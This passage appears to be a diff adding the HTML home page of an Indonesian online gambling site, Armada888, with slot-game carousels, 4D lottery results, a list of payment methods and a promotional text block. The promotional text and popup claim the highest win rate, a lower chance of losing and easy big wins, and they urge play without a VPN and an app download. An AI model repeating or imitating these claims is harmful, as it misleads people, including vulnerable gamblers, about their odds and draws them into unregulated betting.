+                            <a class="swiper-slide" href="javascript:;" onclick="gameAlert()">                            <img loading="lazy" src="https://images.linkcdn.cloud/global/game-list/slot/playtech/pop_66510071_rbp.webp" width="193" height="150" />
+</a>
+                            <a class="swiper-slide" href="javascript:;" onclick="gameAlert()">                            <img loading="lazy" src="https://images.linkcdn.cloud/global/game-list/slot/afg/pokemonBallMaster.webp" width="193" height="150" />
+</a>
+                            <a class="swiper-slide" href="javascript:;" onclick="gameAlert()">                            <img loading="lazy" src="https://images.linkcdn.cloud/global/game-list/slot/microgaming/SMG_cluckinSweetFeast.webp" width="193" height="150" />
+</a>
+                            <a class="swiper-slide" href="javascript:;" onclick="gameAlert()">                            <img loading="lazy" src="https://images.linkcdn.cloud/global/game-list/slot/cq9/133.png" width="193" height="150" />
+</a>
+                            <a class="swiper-slide" href="javascript:;" onclick="gameAlert()">                            <img loading="lazy" src="https://images.linkcdn.cloud/global/game-favorit/populer/S-LK03.jpg" width="193" height="150" />
+</a>
+                            <a class="swiper-slide" href="javascript:;" onclick="gameAlert()">                            <img loading="lazy" src="https://images.linkcdn.cloud/global/game-list/slot/pragmaticplay/vs10luckybnz.webp" width="193" height="150" />
+</a>
+                            <a class="swiper-slide" href="javascript:;" onclick="gameAlert()">                            <img loading="lazy" src="https://images.linkcdn.cloud/global/game-list/slot/afg/nezhaRebirthUltra.webp" width="193" height="150" />
+</a>
+                            <a class="swiper-slide" href="javascript:;" onclick="gameAlert()">                            <img loading="lazy" src="https://images.linkcdn.cloud/global/game-list/slot/bes/be029.webp" width="193" height="150" />
+</a>
+                            <a class="swiper-slide" href="javascript:;" onclick="gameAlert()">                            <img loading="lazy" src="https://images.linkcdn.cloud/global/game-list/slot/nex/sMahPhe.jpg" width="193" height="150" />
+</a>
+                            <a class="swiper-slide" href="javascript:;" onclick="gameAlert()">                            <img loading="lazy" src="https://images.linkcdn.cloud/global/game-list/slot/mmg/71.webp" width="193" height="150" />
+</a>
+                            <a class="swiper-slide" href="javascript:;" onclick="gameAlert()">                            <img loading="lazy" src="https://images.linkcdn.cloud/global/game-list/slot/fsp/S-GM03.webp" width="193" height="150" />
+</a>
+                            <a class="swiper-slide" href="javascript:;" onclick="gameAlert()">                            <img loading="lazy" src="https://images.linkcdn.cloud/global/game-list/slot/pragmaticplay/vs20olympgcl.webp" width="193" height="150" />
+</a>
+                            <a class="swiper-slide" href="javascript:;" onclick="gameAlert()">                            <img loading="lazy" src="https://images.linkcdn.cloud/global/popular-games/mahjong-ways2.webp" width="193" height="150" />
+</a>
+                            <a class="swiper-slide" href="javascript:;" onclick="gameAlert()">                            <img loading="lazy" src="https://images.linkcdn.cloud/global/game-list/slot/afg/kirinMahjongUltra.webp" width="193" height="150" />
+</a>
+                            <a class="swiper-slide" href="javascript:;" onclick="gameAlert()">                            <img loading="lazy" src="https://images.linkcdn.cloud/global/game-list/slot/fsp/S-MP03.jpg" width="193" height="150" />
+</a>
+                            <a class="swiper-slide" href="javascript:;" onclick="gameAlert()">                            <img loading="lazy" src="https://images.linkcdn.cloud/global/game-list/slot/microgaming/SMG_novaBlastUltra.webp" width="193" height="150" />
+</a>
+                          </div>
+                          <!-- Add Paginaton -->
+                          <div class="swiper-pagination">
+                          </div>
+                          <!-- Add Arrows -->
+                          <div class="swiper-button-prev" style="background-image: url(https://images.linkcdn.cloud/global/default/icon/arrow-left.png);">
+                          </div>
+                          <div class="swiper-button-next" style="background-image: url(https://images.linkcdn.cloud/global/default/icon/arrow-right.png);">
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                    <div class="col-lg-4 col-md-6">
+                      <div class="slider-provider">
+                        <div class="slider-provider-title">
+                          Provider Favorit
+                        </div>
+                        <div class="slide-prov-favorit swiper-container">
+                          <div class="swiper-wrapper">
+                            <a class="swiper-slide" href="javascript:;" onclick="gameAlert()">                            <img src="https://images.linkcdn.cloud/global/default/provider-favorit/pra.jpg" />
+</a>
+                            <a class="swiper-slide" href="javascript:;" onclick="gameAlert()">                            <img src="https://images.linkcdn.cloud/global/default/provider-favorit/pra.jpg" />
+</a>
+                            <a class="swiper-slide" href="javascript:;" onclick="gameAlert()">                            <img src="https://images.linkcdn.cloud/global/default/provider-favorit/hbn.jpg" />
+</a>
+                            <a class="swiper-slide" href="javascript:;" onclick="gameAlert()">                            <img src="https://images.linkcdn.cloud/global/default/provider-favorit/afb.jpg" />
+</a>
+                          </div>
+                          <!-- Add Paginaton -->
+                          <div class="swiper-pagination">
+                          </div>
+                          <!-- Add Arrows -->
+                          <div class="swiper-button-prev" style="background-image: url(https://images.linkcdn.cloud/global/default/icon/arrow-left.png);">
+                          </div>
+                          <div class="swiper-button-next" style="background-image: url(https://images.linkcdn.cloud/global/default/icon/arrow-right.png);">
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </section>
+        <section class="home__lotto">
+          <div class="container">
+            <div class="swiper-container lotto-swiper">
+              <div class="swiper-wrapper">
+                <div class="swiper-slide lotto-slide">
+                  <div class="lotto-border">
+                    <a href="javascript:;" onclick="routeNav(&#39;/lottery/4d&#39;)">                    <div class="lotto-item">
+                      <h4 class="lotto-country">
+                        Amsterdam
+                      </h4>
+                      <h6 class="lotto-date">
+                        Rabu, 2026-02-25
+                      </h6>
+                      <div class="lotto-number">
+                        6243
+                      </div>
+                    </div>
+</a>
+                  </div>
+                </div>
+                <div class="swiper-slide lotto-slide">
+                  <div class="lotto-border">
+                    <a href="javascript:;" onclick="routeNav(&#39;/lottery/4d&#39;)">                    <div class="lotto-item">
+                      <h4 class="lotto-country">
+                        Barcelona
+                      </h4>
+                      <h6 class="lotto-date">
+                        Rabu, 2026-02-25
+                      </h6>
+                      <div class="lotto-number">
+                        9047
+                      </div>
+                    </div>
+</a>
+                  </div>
+                </div>
+                <div class="swiper-slide lotto-slide">
+                  <div class="lotto-border">
+                    <a href="javascript:;" onclick="routeNav(&#39;/lottery/4d&#39;)">                    <div class="lotto-item">
+                      <h4 class="lotto-country">
+                        Beijing
+                      </h4>
+                      <h6 class="lotto-date">
+                        Rabu, 2026-02-25
+                      </h6>
+                      <div class="lotto-number">
+                        0358
+                      </div>
+                    </div>
+</a>
+                  </div>
+                </div>
+                <div class="swiper-slide lotto-slide">
+                  <div class="lotto-border">
+                    <a href="javascript:;" onclick="routeNav(&#39;/lottery/4d&#39;)">                    <div class="lotto-item">
+                      <h4 class="lotto-country">
+                        Berlin
+                      </h4>
+                      <h6 class="lotto-date">
+                        Selasa, 2026-02-24
+                      </h6>
+                      <div class="lotto-number">
+                        4729
+                      </div>
+                    </div>
+</a>
+                  </div>
+                </div>
+                <div class="swiper-slide lotto-slide">
+                  <div class="lotto-border">
+                    <a href="javascript:;" onclick="routeNav(&#39;/lottery/4d&#39;)">                    <div class="lotto-item">
+                      <h4 class="lotto-country">
+                        Bangkok
+                      </h4>
+                      <h6 class="lotto-date">
+                        Rabu, 2026-02-25
+                      </h6>
+                      <div class="lotto-number">
+                        5627
+                      </div>
+                    </div>
+</a>
+                  </div>
+                </div>
+                <div class="swiper-slide lotto-slide">
+                  <div class="lotto-border">
+                    <a href="javascript:;" onclick="routeNav(&#39;/lottery/4d&#39;)">                    <div class="lotto-item">
+                      <h4 class="lotto-country">
+                        Bullseye
+                      </h4>
+                      <h6 class="lotto-date">
+                        Rabu, 2026-02-25
+                      </h6>
+                      <div class="lotto-number">
+                        1201
+                      </div>
+                    </div>
+</a>
+                  </div>
+                </div>
+                <div class="swiper-slide lotto-slide">
+                  <div class="lotto-border">
+                    <a href="javascript:;" onclick="routeNav(&#39;/lottery/4d&#39;)">                    <div class="lotto-item">
+                      <h4 class="lotto-country">
+                        Hongkong
+                      </h4>
+                      <h6 class="lotto-date">
+                        Rabu, 2026-02-25
+                      </h6>
+                      <div class="lotto-number">
+                        9663
+                      </div>
+                    </div>
+</a>
+                  </div>
+                </div>
+                <div class="swiper-slide lotto-slide">
+                  <div class="lotto-border">
+                    <a href="javascript:;" onclick="routeNav(&#39;/lottery/4d&#39;)">                    <div class="lotto-item">
+                      <h4 class="lotto-country">
+                        Hongkong47
+                      </h4>
+                      <h6 class="lotto-date">
+                        Rabu, 2026-02-25
+                      </h6>
+                      <div class="lotto-number">
+                        5106
+                      </div>
+                    </div>
+</a>
+                  </div>
+                </div>
+                <div class="swiper-slide lotto-slide">
+                  <div class="lotto-border">
+                    <a href="javascript:;" onclick="routeNav(&#39;/lottery/4d&#39;)">                    <div class="lotto-item">
+                      <h4 class="lotto-country">
+                        Hongkong49
+                      </h4>
+                      <h6 class="lotto-date">
+                        Rabu, 2026-02-25
+                      </h6>
+                      <div class="lotto-number">
+                        0892
+                      </div>
+                    </div>
+</a>
+                  </div>
+                </div>
+                <div class="swiper-slide lotto-slide">
+                  <div class="lotto-border">
+                    <a href="javascript:;" onclick="routeNav(&#39;/lottery/4d&#39;)">                    <div class="lotto-item">
+                      <h4 class="lotto-country">
+                        Kampot 4D
+                      </h4>
+                      <h6 class="lotto-date">
+                        Jumat, 2026-01-16
+                      </h6>
+                      <div class="lotto-number">
+                        2645
+                      </div>
+                    </div>
+</a>
+                  </div>
+                </div>
+                <div class="swiper-slide lotto-slide">
+                  <div class="lotto-border">
+                    <a href="javascript:;" onclick="routeNav(&#39;/lottery/4d&#39;)">                    <div class="lotto-item">
+                      <h4 class="lotto-country">
+                        Kampot Letter of Fortune
+                      </h4>
+                      <h6 class="lotto-date">
+                        Jumat, 2026-01-16
+                      </h6>
+                      <div class="lotto-number">
+                        JGGJ
+                      </div>
+                    </div>
+</a>
+                  </div>
+                </div>
+                <div class="swiper-slide lotto-slide">
+                  <div class="lotto-border">
+                    <a href="javascript:;" onclick="routeNav(&#39;/lottery/4d&#39;)">                    <div class="lotto-item">
+                      <h4 class="lotto-country">
+                        Magnum4D
+                      </h4>
+                      <h6 class="lotto-date">
+                        Rabu, 2026-02-25
+                      </h6>
+                      <div class="lotto-number">
+                        0913
+                      </div>
+                    </div>
+</a>
+                  </div>
+                </div>
+                <div class="swiper-slide lotto-slide">
+                  <div class="lotto-border">
+                    <a href="javascript:;" onclick="routeNav(&#39;/lottery/4d&#39;)">                    <div class="lotto-item">
+                      <h4 class="lotto-country">
+                        Manila
+                      </h4>
+                      <h6 class="lotto-date">
+                        Rabu, 2026-02-25
+                      </h6>
+                      <div class="lotto-number">
+                        2890
+                      </div>
+                    </div>
+</a>
+                  </div>
+                </div>
+                <div class="swiper-slide lotto-slide">
+                  <div class="lotto-border">
+                    <a href="javascript:;" onclick="routeNav(&#39;/lottery/4d&#39;)">                    <div class="lotto-item">
+                      <h4 class="lotto-country">
+                        PCSO
+                      </h4>
+                      <h6 class="lotto-date">
+                        Rabu, 2026-02-25
+                      </h6>
+                      <div class="lotto-number">
+                        7730
+                      </div>
+                    </div>
+</a>
+                  </div>
+                </div>
+                <div class="swiper-slide lotto-slide">
+                  <div class="lotto-border">
+                    <a href="javascript:;" onclick="routeNav(&#39;/lottery/4d&#39;)">                    <div class="lotto-item">
+                      <h4 class="lotto-country">
+                        4DRome
+                      </h4>
+                      <h6 class="lotto-date">
+                        Rabu, 2026-02-25
+                      </h6>
+                      <div class="lotto-number">
+                        6552
+                      </div>
+                    </div>
+</a>
+                  </div>
+                </div>
+                <div class="swiper-slide lotto-slide">
+                  <div class="lotto-border">
+                    <a href="javascript:;" onclick="routeNav(&#39;/lottery/4d&#39;)">                    <div class="lotto-item">
+                      <h4 class="lotto-country">
+                        Singapore
+                      </h4>
+                      <h6 class="lotto-date">
+                        Rabu, 2026-02-25
+                      </h6>
+                      <div class="lotto-number">
+                        1516
+                      </div>
+                    </div>
+</a>
+                  </div>
+                </div>
+                <div class="swiper-slide lotto-slide">
+                  <div class="lotto-border">
+                    <a href="javascript:;" onclick="routeNav(&#39;/lottery/4d&#39;)">                    <div class="lotto-item">
+                      <h4 class="lotto-country">
+                        SiberiaPools
+                      </h4>
+                      <h6 class="lotto-date">
+                        Selasa, 2026-02-24
+                      </h6>
+                      <div class="lotto-number">
+                        3982
+                      </div>
+                    </div>
+</a>
+                  </div>
+                </div>
+                <div class="swiper-slide lotto-slide">
+                  <div class="lotto-border">
+                    <a href="javascript:;" onclick="routeNav(&#39;/lottery/4d&#39;)">                    <div class="lotto-item">
+                      <h4 class="lotto-country">
+                        Seoul
+                      </h4>
+                      <h6 class="lotto-date">
+                        Rabu, 2026-02-25
+                      </h6>
+                      <div class="lotto-number">
+                        1275
+                      </div>
+                    </div>
+</a>
+                  </div>
+                </div>
+                <div class="swiper-slide lotto-slide">
+                  <div class="lotto-border">
+                    <a href="javascript:;" onclick="routeNav(&#39;/lottery/4d&#39;)">                    <div class="lotto-item">
+                      <h4 class="lotto-country">
+                        SydneyPools
+                      </h4>
+                      <h6 class="lotto-date">
+                        Rabu, 2026-02-25
+                      </h6>
+                      <div class="lotto-number">
+                        3159
+                      </div>
+                    </div>
+</a>
+                  </div>
+                </div>
+                <div class="swiper-slide lotto-slide">
+                  <div class="lotto-border">
+                    <a href="javascript:;" onclick="routeNav(&#39;/lottery/4d&#39;)">                    <div class="lotto-item">
+                      <h4 class="lotto-country">
+                        Takeo 4D
+                      </h4>
+                      <h6 class="lotto-date">
+                        Jumat, 2026-01-16
+                      </h6>
+                      <div class="lotto-number">
+                        1134
+                      </div>
+                    </div>
+</a>
+                  </div>
+                </div>
+                <div class="swiper-slide lotto-slide">
+                  <div class="lotto-border">
+                    <a href="javascript:;" onclick="routeNav(&#39;/lottery/4d&#39;)">                    <div class="lotto-item">
+                      <h4 class="lotto-country">
+                        Tokyo
+                      </h4>
+                      <h6 class="lotto-date">
+                        Rabu, 2026-02-25
+                      </h6>
+                      <div class="lotto-number">
+                        2418
+                      </div>
+                    </div>
+</a>
+                  </div>
+                </div>
+                <div class="swiper-slide lotto-slide">
+                  <div class="lotto-border">
+                    <a href="javascript:;" onclick="routeNav(&#39;/lottery/4d&#39;)">                    <div class="lotto-item">
+                      <h4 class="lotto-country">
+                        Timor
+                      </h4>
+                      <h6 class="lotto-date">
+                        Rabu, 2026-02-25
+                      </h6>
+                      <div class="lotto-number">
+                        8372
+                      </div>
+                    </div>
+</a>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </section>
+        <section class="home__payment">
+          <div class="container">
+            <div class="row">
+              <div class="col-lg-6 col-md-12">
+                <div class="payment-border">
+                  <div class="payment-content">
+                    <div class="payment-header">
+                      <img src="https://images.linkcdn.cloud/global/default/icon/servicemeter.svg" width="50" height="50" />
+                      <div class="payment-title">
+                        Layanan Member
+                      </div>
+                    </div>
+                    <div class="payment-service">
+                      <div class="service-average">
+                        <div class="service-title">
+                          Tambah Dana
+                        </div>
+                        <div class="service-subtitle">
+                          Waktu
+                        </div>
+                        <div class="progress">
+                          <div id="depositTimeBar" class="progress-bar" role="progressbar" aria-valuenow="" aria-valuemin="0" aria-valuemax="15">
+                          </div>
+                        </div>
+                      </div>
+                      <div class="service-time">
+                        <div class="time-number" id="depositTime">
+                        </div>
+                        <div class="time-title">
+                          Menit
+                        </div>
+                      </div>
+                    </div>
+                    <div class="payment-service">
+                      <div class="service-average">
+                        <div class="service-title">
+                          WITHDRAW
+                        </div>
+                        <div class="service-subtitle">
+                          Waktu
+                        </div>
+                        <div class="progress">
+                          <div id="withdrawTimeBar" class="progress-bar" role="progressbar" aria-valuenow="" aria-valuemin="0" aria-valuemax="15">
+                          </div>
+                        </div>
+                      </div>
+                      <div class="service-time">
+                        <div class="time-number" id="withdrawTime">
+                        </div>
+                        <div class="time-title">
+                          Menit
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div class="col-lg-6 col-md-12">
+                <div class="payment-border">
+                  <div class="payment-content">
+                    <div class="payment-header">
+                      <img src="https://images.linkcdn.cloud/global/default/icon/payment.svg" width="50" height="50" />
+                      <div class="payment-title">
+                        Sistem Pembayaran
+                      </div>
+                    </div>
+                    <div class="swiper-container pembarayan-swiper">
+                      <div class="swiper-wrapper">
+                        <div class="swiper-slide">
+                          <div class="bank-content">
+                            <div class="bank-logo">
+                              <img src="https://images.linkcdn.cloud/global/payment/V2/IDR/bank/jago.webp" />
+                            </div>
+                            <div class="bank-status online">
+                              ONLINE
+                            </div>
+                          </div>
+                        </div>
+                        <div class="swiper-slide">
+                          <div class="bank-content">
+                            <div class="bank-logo">
+                              <img src="https://images.linkcdn.cloud/global/payment/V2/IDR/bank/bca.webp" />
+                            </div>
+                            <div class="bank-status online">
+                              ONLINE
+                            </div>
+                          </div>
+                        </div>
+                        <div class="swiper-slide">
+                          <div class="bank-content">
+                            <div class="bank-logo">
+                              <img src="https://images.linkcdn.cloud/global/payment/V2/IDR/bank/bcadigital.webp" />
+                            </div>
+                            <div class="bank-status online">
+                              ONLINE
+                            </div>
+                          </div>
+                        </div>
+                        <div class="swiper-slide">
+                          <div class="bank-content">
+                            <div class="bank-logo">
+                              <img src="https://images.linkcdn.cloud/global/payment/V2/IDR/epayment/dana.webp" />
+                            </div>
+                            <div class="bank-status online">
+                              ONLINE
+                            </div>
+                          </div>
+                        </div>
+                        <div class="swiper-slide">
+                          <div class="bank-content">
+                            <div class="bank-logo">
+                              <img src="https://images.linkcdn.cloud/global/payment/V2/IDR/epayment/qris.webp" />
+                            </div>
+                            <div class="bank-status online">
+                              ONLINE
+                            </div>
+                          </div>
+                        </div>
+                        <div class="swiper-slide">
+                          <div class="bank-content">
+                            <div class="bank-logo">
+                              <img src="https://images.linkcdn.cloud/global/payment/V2/IDR/epayment/mpay.webp" />
+                            </div>
+                            <div class="bank-status online">
+                              ONLINE
+                            </div>
+                          </div>
+                        </div>
+                        <div class="swiper-slide">
+                          <div class="bank-content">
+                            <div class="bank-logo">
+                              <img src="https://images.linkcdn.cloud/global/payment/V2/IDR/bank/seabank.webp" />
+                            </div>
+                            <div class="bank-status online">
+                              ONLINE
+                            </div>
+                          </div>
+                        </div>
+                        <div class="swiper-slide">
+                          <div class="bank-content">
+                            <div class="bank-logo">
+                              <img src="https://images.linkcdn.cloud/global/payment/V2/IDR/bank/shopeepay.webp" />
+                            </div>
+                            <div class="bank-status online">
+                              ONLINE
+                            </div>
+                          </div>
+                        </div>
+                        <div class="swiper-slide">
+                          <div class="bank-content">
+                            <div class="bank-logo">
+                              <img src="https://images.linkcdn.cloud/global/payment/V2/IDR/bank/bri.png" />
+                            </div>
+                            <div class="bank-status online">
+                              ONLINE
+                            </div>
+                          </div>
+                        </div>
+                        <div class="swiper-slide">
+                          <div class="bank-content">
+                            <div class="bank-logo">
+                              <img src="https://images.linkcdn.cloud/global/payment/V2/IDR/bank/bni.webp" />
+                            </div>
+                            <div class="bank-status online">
+                              ONLINE
+                            </div>
+                          </div>
+                        </div>
+                        <div class="swiper-slide">
+                          <div class="bank-content">
+                            <div class="bank-logo">
+                              <img src="https://images.linkcdn.cloud/global/payment/V2/IDR/bank/mandiri_color.webp" />
+                            </div>
+                            <div class="bank-status online">
+                              ONLINE
+                            </div>
+                          </div>
+                        </div>
+                        <div class="swiper-slide">
+                          <div class="bank-content">
+                            <div class="bank-logo">
+                              <img src="https://images.linkcdn.cloud/global/payment/V2/IDR/bank/bsi.webp" />
+                            </div>
+                            <div class="bank-status online">
+                              ONLINE
+                            </div>
+                          </div>
+                        </div>
+                        <div class="swiper-slide">
+                          <div class="bank-content">
+                            <div class="bank-logo">
+                              <img src="https://images.linkcdn.cloud/global/payment/V2/IDR/bank/ocbc.webp" />
+                            </div>
+                            <div class="bank-status online">
+                              ONLINE
+                            </div>
+                          </div>
+                        </div>
+                        <div class="swiper-slide">
+                          <div class="bank-content">
+                            <div class="bank-logo">
+                              <img src="https://images.linkcdn.cloud/global/payment/V2/IDR/bank/permata.webp" />
+                            </div>
+                            <div class="bank-status online">
+                              ONLINE
+                            </div>
+                          </div>
+                        </div>
+                        <div class="swiper-slide">
+                          <div class="bank-content">
+                            <div class="bank-logo">
+                              <img src="https://images.linkcdn.cloud/global/payment/V2/IDR/epayment/ovo.webp" />
+                            </div>
+                            <div class="bank-status online">
+                              ONLINE
+                            </div>
+                          </div>
+                        </div>
+                        <div class="swiper-slide">
+                          <div class="bank-content">
+                            <div class="bank-logo">
+                              <img src="https://images.linkcdn.cloud/global/payment/V2/IDR/epayment/dana.webp" />
+                            </div>
+                            <div class="bank-status online">
+                              ONLINE
+                            </div>
+                          </div>
+                        </div>
+                        <div class="swiper-slide">
+                          <div class="bank-content">
+                            <div class="bank-logo">
+                              <img src="https://images.linkcdn.cloud/global/payment/V2/IDR/epayment/linkaja.webp" />
+                            </div>
+                            <div class="bank-status online">
+                              ONLINE
+                            </div>
+                          </div>
+                        </div>
+                        <div class="swiper-slide">
+                          <div class="bank-content">
+                            <div class="bank-logo">
+                              <img src="https://images.linkcdn.cloud/global/payment/V2/IDR/epayment/gopay_color.webp" />
+                            </div>
+                            <div class="bank-status online">
+                              ONLINE
+                            </div>
+                          </div>
+                        </div>
+                        <div class="swiper-slide">
+                          <div class="bank-content">
+                            <div class="bank-logo">
+                              <img src="https://images.linkcdn.cloud/global/payment/V2/IDR/phonecredit/telkomsel.webp" />
+                            </div>
+                            <div class="bank-status online">
+                              ONLINE
+                            </div>
+                          </div>
+                        </div>
+                        <div class="swiper-slide">
+                          <div class="bank-content">
+                            <div class="bank-logo">
+                              <img src="https://images.linkcdn.cloud/global/payment/V2/IDR/phonecredit/tri.webp" />
+                            </div>
+                            <div class="bank-status online">
+                              ONLINE
+                            </div>
+                          </div>
+                        </div>
+                        <div class="swiper-slide">
+                          <div class="bank-content">
+                            <div class="bank-logo">
+                              <img src="https://images.linkcdn.cloud/global/payment/V2/IDR/bank/xl.png" />
+                            </div>
+                            <div class="bank-status online">
+                              ONLINE
+                            </div>
+                          </div>
+                        </div>
+                        <div class="swiper-slide">
+                          <div class="bank-content">
+                            <div class="bank-logo">
+                              <img src="https://images.linkcdn.cloud/global/payment/V2/IDR/epayment/sakuku.webp" />
+                            </div>
+                            <div class="bank-status online">
+                              ONLINE
+                            </div>
+                          </div>
+                        </div>
+                        <div class="swiper-slide">
+                          <div class="bank-content">
+                            <div class="bank-logo">
+                              <img src="https://images.linkcdn.cloud/global/payment/V2/IDR/bank/other.webp" />
+                            </div>
+                            <div class="bank-status online">
+                              ONLINE
+                            </div>
+                          </div>
+                        </div>
+                        <div class="swiper-slide">
+                          <div class="bank-content">
+                            <div class="bank-logo">
+                              <img src="https://images.linkcdn.cloud/global/payment/V2/IDR/bank/cimb.webp" />
+                            </div>
+                            <div class="bank-status online">
+                              ONLINE
+                            </div>
+                          </div>
+                        </div>
+                        <div class="swiper-slide">
+                          <div class="bank-content">
+                            <div class="bank-logo">
+                              <img src="https://images.linkcdn.cloud/global/payment/V2/IDR/bank/BNC.webp" />
+                            </div>
+                            <div class="bank-status online">
+                              ONLINE
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                      <!-- Add Pagination -->
+                      <div class="swiper-pagination">
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </section>
+        <section class="home__seo">
+          <div class="container">
+            <div class="game__seo">
+              <div hidden="" id="title-seo">
+                ARMADA888 - SITUS LOGIN GAME PLATFORM ARMADA88
+              </div>
+              <div class="seo-content showFooter">
+                <h1>
+                  <span style="background-color:rgb(255,255,255);color:rgb(43,45,56);">                  ARMADA888 SITUS GAME PLATFORM ONLINE ARMADA88
+</span>
+                </h1>
+                <p>
+                  <a href="https://armada888utama.click">                  ARMADA888
+</a>
+                  login situs game online winrate kemenangan tertinggi - Merupakan salah satu platform permainan game online yang dikenal dengan armada888 menyediakan RTP live yang tinggi, dan juga memastikan peluang kalah yang lebih rendah. Jika sebelumnya kalian pernah bermain game dengan tingkat kekalahan yang tinggi, maka sekarang anda berada ditempat yang tepat. Armada888 merupakan salah satu situs game online dengan tingkat kemenangan tertinggi saat ini.
+                  <br />
+                  Disini kami juga menyediakan beberapa provider populer ternama yang membuat anda bisa nyaman untuk bermain game online disini. Sekarang segudang provider lain juga telah memasuki kancah game online, menawarkan sejumlah pengalaman bermain game online yang luar biasa dengan sensasi tema, suara dan juga permainan game yang dapat dipercaya dan tidak ada duanya.
+                </p>
+                <p>
+                  Ketika pemain mendaftar di situs game online dengan tingkat kemenangan tertinggi dan mulai memainkan permainan game, mereka semua berharap untuk menang dan merebut bonus menang besar yang ditawarkan oleh situs game online tersebut, disini anda akan dengan sangat mudah untuk mendapatkan kemenangan besar. Dengan demikian, kami berharap dapat menyelamatkan Anda dari kerugian yang biasa disebut boncos.
+                </p>
+                <p>
+                  Namun, bagi anda yang tidak terbiasa dengan permainan game dan pasti akan kalah saat bermain game online, pertimbangkan untuk memilih permainan game online yang lagi onfire yang ditawarkan oleh situs game online tersebut. Situs game armada888 juga menawarkan RTP Live, yang bisa anda lihat langsung pada setiap provider yang disediakan disaat milih permainan game sebelum anda memulai permainan.
+                </p>
+                <h2>
+                  Armada88 Situs Melihat Bola Online Terpercaya
+                  <br />
+                </h2>
+                <p>
+                  Situs sportsbook online terbaik dan terpercaya di Indonesia terseru. Armada88 sudah terkenal sebagai salah satu situs melihat bola online terbaik saat ini. Sebagai situs terbaik tentu kami memiliki fasilitas dan juga provider terbaik. ARMADA88 merupakan agen bet online yang di dukung oleh bank terbaik di Indonesia seperti bank BCA, BNI, BRI, MANDIRI dan BSI.
+                </p>
+                <p>
+                  Dengan dukungan dari bank bank ternama dan populer semakin memudahkan anda dalam melakukan transaksi di situs kami. Selain itu untuk memudahkan anda kami juga akan memproses transaksi hanya dengan 3 menit saja. Tak cukup dengan 5 bank ternama, kami juga menyediakan transaksi melalui pulsa 3, telkomsel &amp; juga XL.
+                </p>
+                <p>
+                  Situs melihat bola online Armada88 juga menerima transaksi e-wallet, Armada88 juga di support oleh 4 provider terpercaya yaitu DANA, OVO, Gopay dan LINKaja Semua proses transaksi tersebut akan dilayani selamanya.
+                </p>
+                <p>
+                  Berikut adalah pengenalan singkat kita untuk situs game online ARMADA888 gabung sekarang juga dan nikmati sensasi bermain game online dengan berbagai provider lengkap bersama situs populer ARMADA88, karena memang situs ini tidak ada kurangnya dan tidak akan membuat member ribet dalam bertransaksi. Untuk anda yang penasaran bisa langsung daftar di ARMADA888 karena banyak sekali Promo dan Bonus yang sedang menanti anda di Situs Kami.
+                </p>
+                <p>
+                </p>
+                <figure class="image image_resized" style="width:50%;">
+                  <a href="https://secure.livechatenterprise.com/licence/15472947/v2/open_chat.cgi?groups=0">                  <img src="https://imagizer.imageshack.com/img922/8403/I1FxeY.png" alt="armada888" />
+</a>
+                </figure>
+                <h2 style="text-align:center;">
+                </h2>
+                <p>
+                </p>
+              </div>
+            </div>
+          </div>
+        </section>
+      </div>
+      <div class="modal fade" id="homePopup" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+        <div class="modal-dialog modal-lg">
+          <div class="modal-content">
+            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+              <i class="fas fa-times"></i>
+            </button>
+            <div class="announcement-title">
+              <div class="icon">
+                <i class="fas fa-bullhorn"></i>
+              </div>
+              <h3 class="text-uppercase">
+                Perhatian.
+              </h3>
+            </div>
+            <div class="modal-body">
+              <div class="announcement-content">
+                <p style="margin-left:0px;text-align:center;">
+                  <strong>                  WELCOME TO ARMADA888
+</strong>
+                </p>
+                <figure class="image">
+                  <img src="https://i.gyazo.com/671a4c9f8bf10b3191335bc80d12ed16.png" />
+                </figure>
+                <p style="margin-left:0px;text-align:center;">
+                  <strong>                  Bermain Aman Dan Nyaman Tanpa Vpn Kapanpun Dan Di Manapun
+</strong>
+                  <br />
+                  <a href="armada8.com">                  Klik disini
+</a>
+                  <br />
+                  <strong>                  🤖Download Aplikasi
+</strong>
+                  <br />
+                  <a href="/download/app-1e0fbe5b5cbde375800d84367c7f756cc2b6c107">                  Klik disini
+</a>
+                </p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </main>
+    <footer class="footer">
+      <div class="footer__provider">
+        <div class="container">
+          <div class="provider-header">
+            PROVIDER
+          </div>
+          <div class="provider-holder">
+            <div class="provider-content">
+              <div class="provider-title">
+                <img title="Slot" alt="Slot" src="https://images.linkcdn.cloud/global/icon-footer/Slot.png" width="20" height="20" />
+                <span>                SLOT
+</span>
+              </div>
+              <div class="provider-logo">
+                <img alt="Pragmatic Play" title="Pragmatic Play" src="https://images.linkcdn.cloud/global/logo-footer/slot/pra_footer.png" width="100" height="50" />
+                <img alt="Fat Panda" title="Fat Panda" src="https://images.linkcdn.cloud/global/logo-footer/slot/fat_footer.webp" width="100" height="50" />
+                <img alt="PG Soft" title="PG Soft" src="https://images.linkcdn.cloud/global/logo-footer/slot/pgs_footer.png" width="100" height="50" />
+                <img alt="Afb Gaming" title="Afb Gaming" src="https://images.linkcdn.cloud/global/logo-footer/slot/afg_footer.png" width="100" height="50" />
+                <img alt="NEXTSPIN" title="NEXTSPIN" src="https://images.linkcdn.cloud/global/logo-footer/slot/nex_footer.webp" width="100" height="50" />
+                <img alt="Microgaming" title="Microgaming" src="https://images.linkcdn.cloud/global/logo-footer/slot/micro_logo.png" width="100" height="50" />
+                <img alt="Advantplay" title="Advantplay" src="https://images.linkcdn.cloud/global/logo-footer/slot/adv_footer.png" width="100" height="50" />
+                <img alt="FASTSPIN" title="FASTSPIN" src="https://images.linkcdn.cloud/global/logo-footer/slot/fastspin_footer.png" width="100" height="50" />
+                <img alt="Spade Gaming" title="Spade Gaming" src="https://images.linkcdn.cloud/global/logo-footer/slot/spd_footer.png" width="100" height="50" />
+                <img alt="Playtech Slot" title="Playtech Slot" src="https://images.linkcdn.cloud/global/logo-footer/slot/pla_footer.png" width="100" height="50" />
